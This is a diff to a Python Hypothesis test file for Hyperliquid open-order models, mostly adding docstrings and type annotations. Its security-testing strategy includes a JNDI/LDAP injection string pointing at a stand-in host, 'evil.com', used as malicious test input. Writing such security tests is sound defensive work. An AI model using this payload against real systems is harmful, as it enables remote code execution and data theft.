@@ -29,13 +29,21 @@ from cyberdelta.apis.hyperliquid.models.hl_raw_open_orders import HyperliquidRaw
 from cyberdelta.exceptions.parsing import EmptyStringError
 
 
+# Type alias for malicious input types to avoid long lines
+MaliciousInput = str | int | float | bool | list[str] | dict[str, str] | bytes | None
+
+
 # =============================================================================
 # HYPOTHESIS STRATEGIES FOR OPEN ORDERS MODEL TESTING
 # =============================================================================
 
 
 def decimal_str_strategy() -> SearchStrategy[str]:
-    """Generate valid decimal strings for prices and amounts."""
+    """Generate valid decimal strings for prices and amounts.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
         st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
@@ -57,7 +65,11 @@ def decimal_str_strategy() -> SearchStrategy[str]:
 
 
 def positive_decimal_str_strategy() -> SearchStrategy[str]:
-    """Generate valid positive decimal strings."""
+    """Generate valid positive decimal strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.decimals(min_value=Decimal("0.00000001"), max_value=Decimal(1000000), places=8).map(str),
         st.decimals(min_value=Decimal("0.01"), max_value=Decimal(100000), places=6).map(str),
@@ -70,12 +82,20 @@ def positive_decimal_str_strategy() -> SearchStrategy[str]:
 
 
 def order_id_strategy() -> SearchStrategy[int]:
-    """Generate valid order IDs."""
+    """Generate valid order IDs.
+
+    Returns:
+        SearchStrategy[int]: Strategy for generating test data.
+    """
     return st.integers(min_value=0, max_value=2**63 - 1)
 
 
 def client_order_id_strategy() -> SearchStrategy[str]:
-    """Generate valid client order ID strings."""
+    """Generate valid client order ID strings.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.text(
             min_size=1,
@@ -92,7 +112,11 @@ def client_order_id_strategy() -> SearchStrategy[str]:
 
 
 def asset_symbol_strategy() -> SearchStrategy[str]:
-    """Generate valid asset symbols."""
+    """Generate valid asset symbols.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         st.sampled_from(["BTC", "ETH", "SOL", "USDC", "USDT", "AVAX", "ATOM", "DOT"]),
         st.text(
@@ -106,23 +130,39 @@ def asset_symbol_strategy() -> SearchStrategy[str]:
 
 
 def side_strategy() -> SearchStrategy[str]:
-    """Generate valid order side values."""
+    """Generate valid order side values.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from(["B", "S", "A"])  # Buy, Sell, Ask
 
 
 def tpsl_strategy() -> SearchStrategy[str]:
-    """Generate valid TP/SL values."""
+    """Generate valid TP/SL values.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from(["tp", "sl"])
 
 
 def tif_strategy() -> SearchStrategy[str]:
-    """Generate valid TIF (Time In Force) values."""
+    """Generate valid TIF (Time In Force) values.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.sampled_from(["Gtc", "Ioc", "Alo"])
 
 
 @st.composite
 def valid_trigger_info_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid trigger info data."""
+    """Generate valid trigger info data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "triggerPx": draw(decimal_str_strategy()),
         "isMarket": draw(st.booleans()),
@@ -132,24 +172,48 @@ def valid_trigger_info_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_tif_limit_data(draw: st.DrawFn) -> dict[str, str]:
-    """Generate valid TIF limit data."""
+    """Generate valid TIF limit data.
+
+    Returns:
+        dict[str, str]: Generated test data.
+    """
     return {"tif": draw(tif_strategy())}
+
+
+def _create_limit_order_type(tif: str) -> dict[str, Any]:
+    """Create limit order type data.
+
+    Args:
+        tif: Time in force value.
+
+    Returns:
+        Dictionary with limit order type data.
+    """
+    return {"limit": {"tif": tif}}
 
 
 @st.composite
 def valid_order_type_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid order type data."""
+    """Generate valid order type data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return draw(
         st.one_of([
             st.just({"market": {}}),
-            st.builds(lambda tif: {"limit": {"tif": tif}}, tif=tif_strategy()),
+            st.builds(_create_limit_order_type, tif=tif_strategy()),
         ])
     )
 
 
 @st.composite
 def valid_order_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid order data."""
+    """Generate valid order data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "oid": draw(order_id_strategy()),
         "cloid": draw(client_order_id_strategy()),
@@ -168,7 +232,11 @@ def valid_order_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_open_order_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid open order data."""
+    """Generate valid open order data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "order": draw(valid_order_data()),
         "trigger": draw(valid_trigger_info_data()),
@@ -177,7 +245,11 @@ def valid_open_order_data(draw: st.DrawFn) -> dict[str, Any]:
 
 @st.composite
 def valid_order_spec_data(draw: st.DrawFn) -> dict[str, Any]:
-    """Generate valid order spec data."""
+    """Generate valid order spec data.
+
+    Returns:
+        dict[str, Any]: Generated test data.
+    """
     return {
         "asset": draw(st.integers(min_value=0, max_value=1000)),
         "isBuy": draw(st.booleans()),
@@ -190,8 +262,12 @@ def valid_order_spec_data(draw: st.DrawFn) -> dict[str, Any]:
     }
 
 
-def malicious_orders_strategy() -> SearchStrategy[Any]:
-    """Generate malicious values for orders security testing."""
+def malicious_orders_strategy() -> SearchStrategy[MaliciousInput]:
+    """Generate malicious values for orders security testing.
+
+    Returns:
+        SearchStrategy[str]: Strategy for generating test data.
+    """
     return st.one_of([
         # Order manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-orders}"),
@@ -245,7 +321,7 @@ class TestHyperliquidRawTriggerInfoProperties:
 
     @given(trigger_data=valid_trigger_info_data())
     def test_trigger_info_validation_success_properties(self, trigger_data: dict[str, Any]) -> None:
-        """Property: Valid trigger info data should always create valid trigger info objects."""
+        """Property: Valid data should create valid trigger info objects."""
         # Skip invalid data
         trigger_px = trigger_data["triggerPx"]
         assume(isinstance(trigger_px, str) and trigger_px.strip())
@@ -278,10 +354,10 @@ class TestHyperliquidRawTriggerInfoProperties:
         malicious_value=malicious_orders_strategy(),
     )
     def test_trigger_info_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: MaliciousInput
     ) -> None:
-        """Property: Trigger info should reject malicious inputs safely."""
-        base_data = {
+        """Property: Trigger info should reject malicious inputs."""
+        base_data: dict[str, object] = {
             "triggerPx": "100.0",
             "isMarket": True,
             "tpsl": "tp",
@@ -357,7 +433,9 @@ class TestHyperliquidRawTriggerInfoProperties:
             st.lists(st.booleans()),
         ])
     )
-    def test_trigger_info_invalid_is_market_properties(self, invalid_is_market: Any) -> None:
+    def test_trigger_info_invalid_is_market_properties(
+        self, invalid_is_market: MaliciousInput
+    ) -> None:
         """Property: Trigger info should validate isMarket as boolean."""
         trigger_data = {
             "triggerPx": "100.0",
@@ -449,7 +527,7 @@ class TestHyperliquidRawOpenOrdersIntegrationProperties:
     @given(orders=st.lists(valid_order_data(), min_size=0, max_size=100))
     def test_multiple_orders_validation_properties(self, orders: list[dict[str, Any]]) -> None:
         """Property: Multiple orders should validate independently."""
-        valid_orders = []
+        valid_orders: list[dict[str, Any]] = []
 
         for order_data in orders:
             try:
@@ -625,4 +703,5 @@ def test_HyperliquidRawTriggerInfo_high_precision() -> None:
     obj = HyperliquidRawTriggerInfo.model_validate(payload)
     # Precision may be limited by business logic
     exponent = Decimal(obj.trigger_px).as_tuple().exponent
-    assert isinstance(exponent, int) and exponent >= -8
+    assert isinstance(exponent, int)
+    assert exponent >= -8
